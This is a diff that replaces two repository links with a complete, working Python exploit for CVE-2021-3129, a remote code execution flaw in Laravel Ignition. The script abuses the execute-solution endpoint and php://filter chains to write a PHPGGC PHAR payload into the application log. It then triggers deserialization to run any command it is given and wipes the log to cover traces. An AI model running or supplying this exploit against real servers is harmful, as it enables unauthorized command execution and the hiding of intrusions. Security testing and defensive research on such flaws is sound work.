@@ -1,3 +1,128 @@
-https://github.com/nth347/CVE-2021-3129_exploit?source=post_page-----65182c20b074-----------------------------------------
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import requests
+import subprocess
+import re
+import os
+import sys
 
-https://github.com/joshuavanderpoll/CVE-2021-3129/blob/main/CVE-2021-3129.py
+# Disable SSL insecure warning
+requests.packages.urllib3.disable_warnings(
+    requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+TIMEOUT = 10
+
+
+def send(url='', viewfile=''):
+    # Send POST request with target viewFile value
+    headers = {"Accept": "application/json"}
+    data = {
+        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+        "parameters": {
+            "variableName": "whateverYouWant",
+            "viewFile": ""
+        }
+    }
+    data['parameters']['viewFile'] = viewfile
+    try:
+        return requests.post(url, json=data, headers=headers, verify=False, timeout=TIMEOUT)
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Request error: {e}")
+        return None
+
+
+def generate(chain='', command=''):
+    # Generate encoded PHAR payload using PHPGGC
+    if not os.path.exists("phpggc"):
+        print("[i] PHPGGC not found. Cloning it")
+        os.system("git clone https://github.com/ambionics/phpggc.git")
+    if os.system("which php >/dev/null 2>&1") != 0:
+        print("[!] Local php not found, install php first!")
+        sys.exit(1)
+    payload = subprocess.getoutput(
+        r"php -d'phar.readonly=0' ./phpggc/phpggc '%s' system '%s' --phar phar -o php://output | base64 -w0 | "
+        r"sed -E 's/./\0=00/g; s/==/=3D=/g; s/$/=00/g'" % (chain, command))
+    return payload
+
+
+def clear(url, log_path):
+    # Clear laravel log file using php filter chain
+    print("[i] Trying to clear logs")
+    viewfile = (f"php://filter/write=convert.iconv.utf-8.utf-16be|"
+                f"convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|"
+                f"convert.base64-decode/resource={log_path}")
+    for _ in range(10):
+        resp = send(url, viewfile)
+        if resp and resp.status_code == 200:
+            print("[+] Logs cleared")
+            return True
+    print("[!] Failed to clear logs")
+    return False
+
+
+def convert(url, log_path):
+    # Decode and rewrite log into valid PHAR file
+    viewfile = (f"php://filter/write=convert.quoted-printable-decode|"
+                f"convert.iconv.utf-16le.utf-8|convert.base64-decode/resource={log_path}")
+    resp = send(url, viewfile)
+    return resp is not None and resp.status_code == 200
+
+
+def trigger(url, log_path):
+    # Trigger phar deserialization and fetch command output
+    viewfile = f"phar://{log_path}"
+    resp = send(url, viewfile)
+    if resp is None:
+        return ""
+    result = re.sub(r"\{[\s\S]*\}", "", resp.text)
+    return result.strip()
+
+
+def main():
+    # Parse cli arguments and exploit workflow
+    if len(sys.argv) < 4:
+        print("Usage:   %s <URL> <CHAIN> <CMD> [LOG_PATH]" % sys.argv[0])
+        print("Example: %s http(s)://localhost:8000 Monolog/RCE1 whoami" % sys.argv[0])
+        print("Example: %s http://192.168.181.38 Monolog/RCE1 id /var/www/html/lavita/storage/logs/laravel.log" % sys.argv[0])
+        print("I recommend to use Monolog/RCE1 or Monolog/RCE2 as CHAIN")
+        sys.exit(1)
+
+    base = sys.argv[1].rstrip('/')
+    # Auto prepend http:// if missing
+    if not base.startswith("http"):
+        base = "http://" + base
+    url = base + "/_ignition/execute-solution"
+    chain = sys.argv[2]
+    command = sys.argv[3]
+    log_path = sys.argv[4] if len(sys.argv) >= 5 else "../storage/logs/laravel.log"
+
+    print(f"[*] Exploit endpoint: {url}")
+    print(f"[*] Log path        : {log_path}")
+
+    if not clear(url, log_path):
+        sys.exit(1)
+    send(url, "AA")
+
+    payload = generate(chain, command)
+    if not payload:
+        print("[!] Payload generation failed")
+        sys.exit(1)
+    send(url, payload)
+
+    if convert(url, log_path):
+        print("[+] Successfully converted logs to PHAR")
+    else:
+        print("[-] Failed to convert logs to PHAR (try different padding / chain)")
+
+    output = trigger(url, log_path)
+    if output:
+        print("[+] PHAR deserialized. Exploited\n")
+        print(output)
+    else:
+        print("[i] There is no output")
+
+    clear(url, log_path)
+
+
+if __name__ == '__main__':
+    main()
